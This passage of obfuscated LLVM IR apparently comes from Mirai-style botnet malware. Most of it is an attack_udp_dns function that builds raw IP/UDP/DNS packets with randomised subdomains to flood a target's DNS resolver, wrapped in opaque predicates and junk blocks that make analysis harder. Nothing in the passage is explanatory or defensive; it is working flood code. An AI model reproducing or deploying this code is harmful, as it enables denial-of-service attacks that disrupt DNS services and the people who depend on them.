  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart242, label %originalBB34alteredBB

originalBBpart242:                                ; preds = %originalBB34
  br label %229

; <label>:399:                                    ; preds = %originalBBpart228
  br label %212

; <label>:400:                                    ; preds = %64, %58
  %401 = load i32, i32* @x.33
  %402 = load i32, i32* @y.34
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %400
  %409 = load i32, i32* @x.33
  %410 = load i32, i32* @y.34
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %67
  store i32 0, i32* %9, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %84
  %417 = load i32, i32* %9, align 4
  %418 = load i8, i8* %5, align 1
  %419 = zext i8 %418 to i32
  %420 = icmp slt i32 %417, %419
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %192
  %421 = load i32, i32* %9, align 4
  %_ = sub i32 %421, 1
  %gen = mul i32 %_, 1
  %_7 = shl i32 %421, 1
  %_8 = sub i32 0, %421
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 %421, 1
  %gen11 = mul i32 %_10, 1
  %_12 = sub i32 0, %421
  %gen13 = add i32 %_12, 1
  %_14 = sub i32 0, %421
  %gen15 = add i32 %_14, 1
  %_16 = shl i32 %421, 1
  %_17 = sub i32 %421, 1
  %gen18 = mul i32 %_17, 1
  %422 = add nsw i32 %421, 1
  store i32 %422, i32* %9, align 4
  br label %originalBB6

originalBB22alteredBB:                            ; preds = %originalBB22, %212
  store i32 0, i32* %9, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %229
  %423 = load i32, i32* %9, align 4
  %424 = load i8, i8* %5, align 1
  %425 = zext i8 %424 to i32
  %426 = icmp slt i32 %423, %425
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %250
  %427 = load i8**, i8*** %11, align 8
  %428 = load i32, i32* %9, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds i8*, i8** %427, i64 %429
  %431 = load i8*, i8** %430, align 8
  store i8* %431, i8** %23, align 8
  %432 = load i8*, i8** %23, align 8
  %433 = bitcast i8* %432 to %struct.iphdr*
  store %struct.iphdr* %433, %struct.iphdr** %24, align 8
  %434 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i64 1
  %436 = bitcast %struct.iphdr* %435 to %struct.udphdr*
  store %struct.udphdr* %436, %struct.udphdr** %25, align 8
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 2
  %442 = load i8, i8* %441, align 4
  %443 = zext i8 %442 to i32
  %444 = icmp slt i32 %443, 32
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %380
  %445 = load i32, i32* %9, align 4
  %_35 = sub i32 %445, 1
  %gen36 = mul i32 %_35, 1
  %_37 = sub i32 %445, 1
  %gen38 = mul i32 %_37, 1
  %_39 = sub i32 0, %445
  %gen40 = add i32 %_39, 1
  %446 = add nsw i32 %445, 1
  store i32 %446, i32* %9, align 4
  br label %originalBB34

originalBB44alteredBB:                            ; preds = %originalBB44, %400
  br label %originalBB44
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %4
  br label %556

; <label>:81:                                     ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  br label %556

; <label>:87:                                     ; preds = %81
  %88 = load i32, i32* @x.35
  %89 = load i32, i32* @y.36
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %87
  store i32 1, i32* %9, align 4
  %96 = load i32, i32* %10, align 4
  %97 = bitcast i32* %9 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  %100 = load i32, i32* @x.35
  %101 = load i32, i32* @y.36
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %99, label %108, label %127

; <label>:108:                                    ; preds = %originalBBpart2
  %109 = load i32, i32* @x.35
  %110 = load i32, i32* @y.36
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %108
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @close(i32 %117)
  %119 = load i32, i32* @x.35
  %120 = load i32, i32* @y.36
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %556

; <label>:127:                                    ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %128

; <label>:128:                                    ; preds = %305, %127
  %129 = load i32, i32* %9, align 4
  %130 = load i8, i8* %5, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  br i1 %132, label %133, label %308

; <label>:133:                                    ; preds = %128
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %134 = call noalias i8* @calloc(i64 600, i64 1) #6
  %135 = load i8**, i8*** %11, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  store i8* %134, i8** %138, align 8
  %139 = load i8**, i8*** %11, align 8
  %140 = load i32, i32* %9, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  %143 = load i8*, i8** %142, align 8
  %144 = bitcast i8* %143 to %struct.iphdr*
  store %struct.iphdr* %144, %struct.iphdr** %26, align 8
  %145 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i64 1
  %147 = bitcast %struct.iphdr* %146 to %struct.udphdr*
  store %struct.udphdr* %147, %struct.udphdr** %27, align 8
  %148 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i64 1
  %150 = bitcast %struct.udphdr* %149 to %struct.dnshdr*
  store %struct.dnshdr* %150, %struct.dnshdr** %28, align 8
  %151 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %152 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %151, i64 1
  %153 = bitcast %struct.dnshdr* %152 to i8*
  store i8* %153, i8** %29, align 8
  %154 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = and i8 %156, 15
  %158 = or i8 %157, 64
  store i8 %158, i8* %155, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %160 = bitcast %struct.iphdr* %159 to i8*
  %161 = load i8, i8* %160, align 4
  %162 = and i8 %161, -16
  %163 = or i8 %162, 5
  store i8 %163, i8* %160, align 4
  %164 = load i8, i8* %12, align 1
  %165 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 1
  store i8 %164, i8* %166, align 1
  %167 = load i8, i8* %19, align 1
  %168 = zext i8 %167 to i64
  %169 = add i64 41, %168
  %170 = add i64 %169, 2
  %171 = load i32, i32* %21, align 4
  %172 = sext i32 %171 to i64
  %173 = add i64 %170, %172
  %174 = add i64 %173, 4
  %175 = trunc i64 %174 to i16
  %176 = call zeroext i16 @htons(i16 zeroext %175) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 2
  store i16 %176, i16* %178, align 2
  %179 = load i16, i16* %13, align 2
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i8, i8* %14, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 5
  store i8 %183, i8* %185, align 4
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %133
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %133
  %193 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 17, i8* %194, align 1
  %195 = load i32, i32* @LOCAL_ADDR, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load i32, i32* %22, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 9
  store i32 %198, i32* %200, align 4
  %201 = load i16, i16* %16, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %204 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %203, i32 0, i32 0
  store i16 %202, i16* %204, align 2
  %205 = load i16, i16* %17, align 2
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %208 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %207, i32 0, i32 1
  store i16 %206, i16* %208, align 2
  %209 = load i8, i8* %19, align 1
  %210 = zext i8 %209 to i64
  %211 = add i64 21, %210
  %212 = add i64 %211, 2
  %213 = load i32, i32* %21, align 4
  %214 = sext i32 %213 to i64
  %215 = add i64 %212, %214
  %216 = add i64 %215, 4
  %217 = trunc i64 %216 to i16
  %218 = call zeroext i16 @htons(i16 zeroext %217) #7
  %219 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %220 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %219, i32 0, i32 2
  store i16 %218, i16* %220, align 2
  %221 = load i16, i16* %18, align 2
  %222 = call zeroext i16 @htons(i16 zeroext %221) #7
  %223 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %224 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %223, i32 0, i32 0
  store i16 %222, i16* %224, align 2
  %225 = call zeroext i16 @htons(i16 zeroext 256) #7
  %226 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %227 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %226, i32 0, i32 1
  store i16 %225, i16* %227, align 2
  %228 = call zeroext i16 @htons(i16 zeroext 1) #7
  %229 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %230 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %229, i32 0, i32 2
  store i16 %228, i16* %230, align 2
  %231 = load i8, i8* %19, align 1
  %232 = load i8*, i8** %29, align 8
  %233 = getelementptr inbounds i8, i8* %232, i32 1
  store i8* %233, i8** %29, align 8
  store i8 %231, i8* %232, align 1
  %234 = load i8, i8* %19, align 1
  %235 = zext i8 %234 to i32
  %236 = load i8*, i8** %29, align 8
  %237 = sext i32 %235 to i64
  %238 = getelementptr inbounds i8, i8* %236, i64 %237
  store i8* %238, i8** %29, align 8
  %239 = load i8*, i8** %29, align 8
  store i8* %239, i8** %30, align 8
  %240 = load i8*, i8** %29, align 8
  %241 = getelementptr inbounds i8, i8* %240, i64 1
  %242 = load i8*, i8** %20, align 8
  %243 = load i32, i32* %21, align 4
  %244 = add nsw i32 %243, 1
  call void @util_memcpy(i8* %241, i8* %242, i32 %244)
  store i32 0, i32* %23, align 4
  br label %245

; <label>:245:                                    ; preds = %287, %192
  %246 = load i32, i32* %23, align 4
  %247 = load i32, i32* %21, align 4
  %248 = icmp slt i32 %246, %247
  br i1 %248, label %249, label %290

; <label>:249:                                    ; preds = %245
  %250 = load i8*, i8** %20, align 8
  %251 = load i32, i32* %23, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds i8, i8* %250, i64 %252
  %254 = load i8, i8* %253, align 1
  %255 = sext i8 %254 to i32
  %256 = icmp eq i32 %255, 46
  br i1 %256, label %257, label %267

; <label>:257:                                    ; preds = %249
  %258 = load i8, i8* %24, align 1
  %259 = load i8*, i8** %30, align 8
  store i8 %258, i8* %259, align 1
  store i8 0, i8* %24, align 1
  %260 = load i8, i8* %25, align 1
  %261 = add i8 %260, 1
  store i8 %261, i8* %25, align 1
  %262 = load i8*, i8** %29, align 8
  %263 = load i32, i32* %23, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds i8, i8* %262, i64 %264
  %266 = getelementptr inbounds i8, i8* %265, i64 1
  store i8* %266, i8** %30, align 8
  br label %286

; <label>:267:                                    ; preds = %249
  %268 = load i32, i32* @x.35
  %269 = load i32, i32* @y.36
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %267
  %276 = load i8, i8* %24, align 1
  %277 = add i8 %276, 1
  store i8 %277, i8* %24, align 1
  %278 = load i32, i32* @x.35
  %279 = load i32, i32* @y.36
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBBpart215, label %originalBB6alteredBB

originalBBpart215:                                ; preds = %originalBB6
  br label %286

; <label>:286:                                    ; preds = %originalBBpart215, %257
  br label %287

; <label>:287:                                    ; preds = %286
  %288 = load i32, i32* %23, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %23, align 4
  br label %245

; <label>:290:                                    ; preds = %245
  %291 = load i8, i8* %24, align 1
  %292 = load i8*, i8** %30, align 8
  store i8 %291, i8* %292, align 1
  %293 = load i8*, i8** %29, align 8
  %294 = load i32, i32* %21, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8, i8* %293, i64 %295
  %297 = getelementptr inbounds i8, i8* %296, i64 2
  %298 = bitcast i8* %297 to %struct.grehdr*
  store %struct.grehdr* %298, %struct.grehdr** %31, align 8
  %299 = call zeroext i16 @htons(i16 zeroext 1) #7
  %300 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %301 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %300, i32 0, i32 0
  store i16 %299, i16* %301, align 2
  %302 = call zeroext i16 @htons(i16 zeroext 1) #7
  %303 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %304 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %303, i32 0, i32 1
  store i16 %302, i16* %304, align 2
  br label %305

; <label>:305:                                    ; preds = %290
  %306 = load i32, i32* %9, align 4
  %307 = add nsw i32 %306, 1
  store i32 %307, i32* %9, align 4
  br label %128

; <label>:308:                                    ; preds = %128
  %309 = load i32, i32* @x.35
  %310 = load i32, i32* @y.36
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %308
  %317 = load i32, i32* @x.35
  %318 = load i32, i32* @y.36
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %325

; <label>:325:                                    ; preds = %originalBBpart260, %originalBBpart219
  store i32 0, i32* %9, align 4
  br label %326

; <label>:326:                                    ; preds = %originalBBpart256, %325
  %327 = load i32, i32* %9, align 4
  %328 = load i8, i8* %5, align 1
  %329 = zext i8 %328 to i32
  %330 = icmp slt i32 %327, %329
  br i1 %330, label %331, label %539

; <label>:331:                                    ; preds = %326
  %332 = load i32, i32* @x.35
  %333 = load i32, i32* @y.36
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %331
  %340 = load i8**, i8*** %11, align 8
  %341 = load i32, i32* %9, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds i8*, i8** %340, i64 %342
  %344 = load i8*, i8** %343, align 8
  store i8* %344, i8** %32, align 8
  %345 = load i8*, i8** %32, align 8
  %346 = bitcast i8* %345 to %struct.iphdr*
  store %struct.iphdr* %346, %struct.iphdr** %33, align 8
  %347 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i64 1
  %349 = bitcast %struct.iphdr* %348 to %struct.udphdr*
  store %struct.udphdr* %349, %struct.udphdr** %34, align 8
  %350 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i64 1
  %352 = bitcast %struct.udphdr* %351 to %struct.dnshdr*
  store %struct.dnshdr* %352, %struct.dnshdr** %35, align 8
  %353 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %354 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %353, i64 1
  %355 = bitcast %struct.dnshdr* %354 to i8*
  %356 = getelementptr inbounds i8, i8* %355, i64 1
  store i8* %356, i8** %36, align 8
  %357 = load i16, i16* %13, align 2
  %358 = zext i16 %357 to i32
  %359 = icmp eq i32 %358, 65535
  %360 = load i32, i32* @x.35
  %361 = load i32, i32* @y.36
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %359, label %368, label %390

; <label>:368:                                    ; preds = %originalBBpart223
  %369 = load i32, i32* @x.35
  %370 = load i32, i32* @y.36
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %368
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 3
  store i16 %379, i16* %381, align 4
  %382 = load i32, i32* @x.35
  %383 = load i32, i32* @y.36
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBBpart233, label %originalBB25alteredBB

originalBBpart233:                                ; preds = %originalBB25
  br label %390

; <label>:390:                                    ; preds = %originalBBpart233, %originalBBpart223
  %391 = load i16, i16* %16, align 2
  %392 = zext i16 %391 to i32
  %393 = icmp eq i32 %392, 65535
  br i1 %393, label %394, label %416

; <label>:394:                                    ; preds = %390
  %395 = load i32, i32* @x.35
  %396 = load i32, i32* @y.36
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %394
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %407 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %406, i32 0, i32 0
  store i16 %405, i16* %407, align 2
  %408 = load i32, i32* @x.35
  %409 = load i32, i32* @y.36
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart243, label %originalBB35alteredBB

originalBBpart243:                                ; preds = %originalBB35
  br label %416

; <label>:416:                                    ; preds = %originalBBpart243, %390
  %417 = load i16, i16* %17, align 2
  %418 = zext i16 %417 to i32
  %419 = icmp eq i32 %418, 65535
  br i1 %419, label %420, label %426

; <label>:420:                                    ; preds = %416
  %421 = call i32 @rand_next()
  %422 = and i32 %421, 65535
  %423 = trunc i32 %422 to i16
  %424 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %425 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %424, i32 0, i32 1
  store i16 %423, i16* %425, align 2
  br label %426

; <label>:426:                                    ; preds = %420, %416
  %427 = load i32, i32* @x.35
  %428 = load i32, i32* @y.36
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %426
  %435 = load i16, i16* %18, align 2
  %436 = zext i16 %435 to i32
  %437 = icmp eq i32 %436, 65535
  %438 = load i32, i32* @x.35
  %439 = load i32, i32* @y.36
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %437, label %446, label %452

; <label>:446:                                    ; preds = %originalBBpart247
  %447 = call i32 @rand_next()
  %448 = and i32 %447, 65535
  %449 = trunc i32 %448 to i16
  %450 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %451 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %450, i32 0, i32 0
  store i16 %449, i16* %451, align 2
  br label %452

; <label>:452:                                    ; preds = %446, %originalBBpart247
  %453 = load i8*, i8** %36, align 8
  %454 = load i8, i8* %19, align 1
  %455 = zext i8 %454 to i32
  call void @rand_alphastr(i8* %453, i32 %455)
  %456 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 7
  store i16 0, i16* %457, align 2
  %458 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %459 = bitcast %struct.iphdr* %458 to i16*
